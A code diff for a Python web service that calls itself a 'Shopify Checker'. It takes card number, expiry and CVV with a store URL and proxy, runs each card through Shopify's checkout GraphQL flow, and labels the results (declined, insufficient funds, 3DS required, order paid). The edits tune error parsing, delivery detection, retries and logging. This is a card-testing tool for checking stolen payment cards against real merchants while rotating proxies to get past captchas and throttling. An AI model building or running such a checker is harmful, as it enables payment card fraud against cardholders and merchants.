@@ -935,22 +935,6 @@ def _initial_shipping_line(billing_street, stable_id):
 def extract_clean_response(message):
     if not message: return "UNKNOWN_ERROR"
     message = str(message)
-
-    # ── Preserve known codes exactly (stops "3DS_…" → "DS_…" regex bug) ──
-    up = message.upper().strip()
-    for known in (
-        "3DS_REQUIRED", "3DS_REQUIRED:",
-        "INSUFFICIENT_FUNDS", "INSUFFICIENT_FUNDS:",
-        "CARD_DECLINED", "CARD_DECLINED:",
-        "ORDER_PAID", "ORDER_CONFIRMED",
-        "CHECKPOINT_SOLVABLE", "CHECKPOINT_SOLVABLE:",
-        "CAPTCHA_REQUIRED", "CAPTCHA_REQUIRED:",
-        "CAPTCHA_BLOCKED", "CAPTCHA_BLOCKED:",
-        "THROTTLED", "BELOW_MERCHANT_MINIMUM",
-    ):
-        if up.startswith(known):
-            return message[:120]
-
     BLOCK = {"skip_shop_pay", "auto_redirect", "edge_redirect",
              "locale", "true", "false", "null", "undefined"}
     if message.lower().strip() in BLOCK: return "UNKNOWN_ERROR"
@@ -1464,16 +1448,6 @@ async def gql(session, op_name, headers, payload, proxy,
 
 
 def _extract_amounts_from_seller(sp):
-    """
-    Extracts amount + payment method info from sellerProposal.
-
-    PATCHES:
-      - Force gateway display to "Shopify Payments" (all stores use Shopify).
-      - Read 3 extra amount sources when checkoutTotal/total are missing:
-          * payment.totalAmount
-          * payment.paymentLines[0].amount
-          * runningTotal (already present)
-    """
     out = {
         "checkout_total": None, "total": None, "running": None,
         "payment_identifier": None, "payment_stable_id": None,
@@ -1482,29 +1456,14 @@ def _extract_amounts_from_seller(sp):
     }
     try:
         v = (sp.get("checkoutTotal") or {}).get("value", {}).get("amount")
-        if _positive_amount(v): out["checkout_total"] = str(v)
+        if v is not None: out["checkout_total"] = str(v)
         v = (sp.get("total") or {}).get("value", {}).get("amount")
-        if _positive_amount(v): out["total"] = str(v)
+        if v is not None: out["total"] = str(v)
         v = (sp.get("runningTotal") or {}).get("value", {}).get("amount")
-        if _positive_amount(v): out["running"] = str(v)
+        if v is not None: out["running"] = str(v)
     except Exception: pass
-
     try:
         pay = sp.get("payment") or {}
-
-        # Extra fallbacks for amount
-        if not out["checkout_total"]:
-            v = (pay.get("totalAmount") or {}).get("value", {}).get("amount")
-            if _positive_amount(v):
-                out["checkout_total"] = str(v)
-        if not out["checkout_total"]:
-            for _pl in (pay.get("paymentLines") or []):
-                if isinstance(_pl, dict):
-                    v = (_pl.get("amount") or {}).get("value", {}).get("amount")
-                    if _positive_amount(v):
-                        out["checkout_total"] = str(v)
-                        break
-
         if pay.get("__typename") == "FilledPaymentTerms":
             best = None
             for m in pay.get("availablePaymentLines", []):
@@ -1516,8 +1475,7 @@ def _extract_amounts_from_seller(sp):
                 if best is None: best = pm
             if best:
                 out["payment_identifier"] = best["paymentMethodIdentifier"]
-                # ── FIX: always display as Shopify Payments ───────────────
-                out["gateway"] = "Shopify Payments"
+                out["gateway"] = (best.get("extensibilityDisplayName") or best.get("name"))
         pl = pay.get("paymentLines") or []
         if pl and isinstance(pl[0], dict):
             out["payment_stable_id"] = pl[0].get("stableId")
@@ -2014,28 +1972,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             _h, _ = resolve_delivery_strategy(_fl)
             if _h: delivery_strategy = _h
 
-            # ── FIX: strong digital-product detection ────────────────────
             _is_ship_req = seller.get("isShippingRequired")
-            _avail_strategies = _fl.get("availableDeliveryStrategies") or []
-            _delivery_line_types = _fl.get("deliveryMethodTypes") or []
-
-            if dtype == "FilledDeliveryTerms":
-                if _is_ship_req is False:
-                    no_delivery_mode = True
-                elif _rs is False:
-                    no_delivery_mode = True
-                elif not _avail_strategies:
-                    # Store offers no shipping rates → digital only
-                    no_delivery_mode = True
-                elif _delivery_line_types == ["NONE"]:
-                    no_delivery_mode = True
-                elif _delivery_line_types and "SHIPPING" not in _delivery_line_types:
-                    no_delivery_mode = True
+            if dtype == "FilledDeliveryTerms" and _is_ship_req is False:
+                no_delivery_mode = True
+            elif dtype == "FilledDeliveryTerms" and _rs is False:
+                no_delivery_mode = True
 
             print(f"[proposal#1] ⏱{time.time()-t0:.2f}s dtype={dtype!r} "
-                  f"strat={delivery_strategy!r} rs={_rs} ship_req={_is_ship_req} "
-                  f"strategies={len(_avail_strategies)} types={_delivery_line_types} "
-                  f"no_delivery={no_delivery_mode}")
+                  f"strat={delivery_strategy!r} ship_req={_rs} no_delivery={no_delivery_mode}")
 
             if dtype == "UnavailableTerms":
                 print(f"[P1] ⚠️ UnavailableTerms — FULL RESPONSE:")
@@ -2150,85 +2094,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if _looks_like_connection_error(resp_text):
                     return False, "Change Proxy", gateway, variant_price_fallback, currency
                 return False, "Delivery parse error", gateway, variant_price_fallback, currency
-
-            # ── FIX: retry P2 once on DELIVERY_* mismatch ────────────────
             if "errors" in _dj:
-                err_msg = str(_dj["errors"][0].get("message", "") or "")
-                if "DELIVERY_" in err_msg or "DELIVERY_" in resp_text:
-                    print(f"[P2] ⚠️ delivery mismatch ({err_msg[:80]}) — refreshing P1, retrying P2 once")
-                    await asyncio.sleep(0.8)
-                    # Re-fetch P1 to get fresh delivery state
-                    response, resp_text = await gql(
-                        session, "Proposal", headers, proposal_payload, proxy,
-                        checkout_html=text, checkout_origin=checkout_origin,
-                        build_id=build_id, profile=profile)
-                    if resp_text == "Change Proxy":
-                        return False, "Change Proxy", gateway, variant_price_fallback, currency
-                    try:
-                        _rj = json.loads(resp_text)
-                        _r_fr = (_rj.get("data", {}).get("session", {})
-                                 .get("negotiate", {}).get("result", {})) or {}
-                        _s_fr = _r_fr.get("sellerProposal") or {}
-                        _fl2 = ((_s_fr.get("delivery") or {}).get("deliveryLines") or [{}])[0] or {}
-                        _h2, _ = resolve_delivery_strategy(_fl2)
-                        if _h2: delivery_strategy = _h2
-                        _sid2 = extract_merch_stable_id(_fl2)
-                        if _sid2: negotiated_stable_id = _sid2
-                        # Rebuild delivery input with fresh strategy
-                        if no_delivery_mode:
-                            active_delivery_input = {
-                                "deliveryLines": [_delivery_none_line(negotiated_stable_id)],
-                                "noDeliveryRequired": [], "useProgressiveRates": True,
-                                "prefetchShippingRatesStrategy": None,
-                                "interfaceFlow": "SHOPIFY", "supportsSplitShipping": True,
-                            }
-                        else:
-                            _dl2 = {
-                                "destination": {"streetAddress": dict(billing_street)},
-                                "targetMerchandiseLines": _delivery_target(negotiated_stable_id),
-                                "deliveryMethodTypes": ["SHIPPING"],
-                                "expectedTotalPrice": {"any": True},
-                                "destinationChanged": True,
-                            }
-                            if delivery_strategy:
-                                _dl2["selectedDeliveryStrategy"] = {
-                                    "deliveryStrategyByHandle": {
-                                        "handle": delivery_strategy,
-                                        "customDeliveryRate": False},
-                                    "options": {}}
-                            else:
-                                _dl2["selectedDeliveryStrategy"] = {
-                                    "deliveryStrategyMatchingConditions": {
-                                        "estimatedTimeInTransit": {"any": True},
-                                        "shipments": {"any": True}},
-                                    "options": {}}
-                            active_delivery_input = {
-                                "deliveryLines": [_dl2], "noDeliveryRequired": [],
-                                "useProgressiveRates": True,
-                                "prefetchShippingRatesStrategy": None,
-                                "interfaceFlow": "SHOPIFY", "supportsSplitShipping": True,
-                            }
-                        proposal_variables["delivery"] = active_delivery_input
-                        await _gql_gap(0.5, 1.0)
-                        response, resp_text = await gql(
-                            session, "Proposal", headers, proposal_payload, proxy,
-                            checkout_html=text, checkout_origin=checkout_origin,
-                            build_id=build_id, profile=profile)
-                        try:
-                            _dj = json.loads(resp_text)
-                        except Exception:
-                            _dj = {}
-                        if "errors" not in _dj:
-                            print(f"[P2] ✅ retry succeeded")
-                        else:
-                            return False, f"Delivery error: {_dj['errors'][0].get('message')}", \
-                                   gateway, variant_price_fallback, currency
-                    except Exception as e:
-                        return False, f"Delivery retry failed: {str(e)[:80]}", \
-                               gateway, variant_price_fallback, currency
-                else:
-                    return False, f"Delivery error: {err_msg}", \
-                           gateway, variant_price_fallback, currency
+                return False, f"Delivery error: {_dj['errors'][0].get('message')}", \
+                       gateway, variant_price_fallback, currency
 
             _r2 = (_dj.get("data", {}).get("session", {})
                    .get("negotiate", {}).get("result", {})) or {}
@@ -2758,18 +2626,13 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     raw_code = err.get("code", "") or "PAYMENT_FAILED"
                     msg = (err.get("messageUntranslated") or err.get("message") or "")
                     if isinstance(msg, dict): msg = json.dumps(msg)
-                    msg = str(msg).strip()
-                    print(f"[poll] FailedReceipt code={raw_code} msg={msg[:120]}")
-                    if "minimum payment amount" in msg.lower():
-                        return False, f"BELOW_MERCHANT_MINIMUM: {msg[:120]}" if msg else "BELOW_MERCHANT_MINIMUM", gateway, total_price, currency
+                    print(f"[poll] FailedReceipt code={raw_code} msg={str(msg)[:120]}")
+                    if "minimum payment amount" in str(msg).lower():
+                        return False, "BELOW_MERCHANT_MINIMUM", gateway, total_price, currency
                     if raw_code == "PAYMENTS_INSUFFICIENT_FUNDS":
-                        return False, (f"INSUFFICIENT_FUNDS: {msg[:120]}" if msg else "INSUFFICIENT_FUNDS"), \
-                               gateway, total_price, currency
+                        raw_code = "INSUFFICIENT_FUNDS"
                     if raw_code == "CAPTCHA_REQUIRED":
-                        return False, (f"CAPTCHA_BLOCKED: {msg[:120]}" if msg else "CAPTCHA_BLOCKED"), \
-                               gateway, total_price, currency
-                    if msg:
-                        return False, f"{raw_code}: {msg[:120]}", gateway, total_price, currency
+                        raw_code = "CARD_DECLINED"
                     return False, raw_code, gateway, total_price, currency
                 if tn == "ActionRequiredReceipt":
                     return False, "3DS_REQUIRED", gateway, total_price, currency
@@ -2841,6 +2704,7 @@ def index():
     raw_qs = request.query_string.decode(errors="ignore")
     first  = raw_qs.split("&", 1)[0] if raw_qs else ""
 
+    # Info mode — browser hit, nothing card-shaped
     if "|" not in first:
         return _pretty({
             "name": "Shopify Checker — node_client compatible",
@@ -2854,6 +2718,7 @@ def index():
             "raw_queries_available": _RAW_QUERIES_AVAILABLE,
         })
 
+    # Card-check mode
     card_string = first
     site        = request.args.get("site") or DEFAULT_SITE
     proxy_str   = request.args.get("proxy", "")
@@ -2930,7 +2795,6 @@ def index():
         "Time":     f"{elapsed:.2f}s",
         "Status":   success,
         "message":  clean,
-        "Detail":   str(message)[:200],
         "gateway":  gateway or "Shopify Payments",
         "price":    str(pf),
         "currency": currency or "USD",
@@ -3010,7 +2874,7 @@ def ids_endpoint():
     })
 
 
-# ── Health endpoint ────────────────────────────────────────────────────────
+# ── Health endpoint — what node_client.py reads ─────────────────────────────
 @app.route("/health", methods=["GET"])
 def health():
     with _state_lock:
